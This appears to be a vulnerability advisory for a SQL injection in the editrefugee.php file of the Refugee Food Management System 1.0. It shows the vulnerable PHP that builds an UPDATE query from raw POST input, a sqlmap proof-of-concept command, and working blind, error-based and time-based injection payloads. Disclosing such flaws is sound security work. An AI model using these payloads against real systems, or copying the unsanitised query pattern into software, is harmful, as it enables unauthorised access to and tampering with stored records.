# SQLi in code-projects Refugee Food Management System 1.0 of file /home/editrefugee.php

**vender**:

- https://code-projects.org/refugee-food-management-system-in-php-with-source-code/

**SoftLink**:

- https://download.code-projects.org/details/491fdab9-7421-418b-93a2-bb506ba9cf02

**Vulnerable File**

- /home/editrefugee.php

**Version**

- V1.0

**Description**

A vulnerability was determined in code-projects Refugee Food Management System 1.0. The affected element is an unknown function of the file /home/editrefugee.php. This manipulation of the argument a causes sql injection. The attack is possible to be carried out remotely. The exploit has been publicly disclosed and may be utilized.

### Analyse

```php
<?php
if(isset($_POST['Register'])){

$a = $_POST['a'];
$f = $_POST['b'];
$l = $_POST['c'];
$s = $_POST['sex'];
$aa = $_POST['d'];
$c = $_POST['e'];
$nationality_nid= $_POST['nationality_nid'];

$qry1 = mysql_query(" UPDATE refugee SET Fname='$f', Lname='$l', sex='$s',age='$aa', contact ='$c', 
nationality_nid='$nationality_nid' WHERE rfid='$a' ");
	

			if($qry1){

				echo 'successfully updated... ';

				echo '<script type="text/javascript">

						var myVar=setInterval(function(){myTimer()},2000);

				function myTimer()
				{
				window.location="pagenateRefugeesList.php";

				}
			</script>';
			}else {	echo mysql_error();	}

	
	}
?>		 
```

### POC

```bash
 sqlmap -u "http://192.168.93.1/Refugee/home/editrefugee.php" --data="a=&b=&c=&sex=&d=&e=&nationality_nid=1&Register=Update" --level=2 --thread=10 --batch --flush-session
--cookie="PHPSESSID=8t8psifm12nv6m77co7g5e6qo5"
```



```bash
---
Parameter: a (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: a=' AND 2901=(SELECT (CASE WHEN (2901=2901) THEN 2901 ELSE (SELECT 4552 UNION SELECT 1975) END))-- -&b=&c=&sex=&d=&e=&nationality_nid=1&Register=Update

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: a=' AND GTID_SUBSET(CONCAT(0x71786a7071,(SELECT (ELT(3169=3169,1))),0x7176787a71),3169) AND 'zeBM'='zeBM&b=&c=&sex=&d=&e=&nationality_nid=1&Register=Update

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: a=' OR (SELECT 3339 FROM (SELECT(SLEEP(5)))nYPL) AND 'wsZN'='wsZN&b=&c=&sex=&d=&e=&nationality_nid=1&Register=Update
---
```

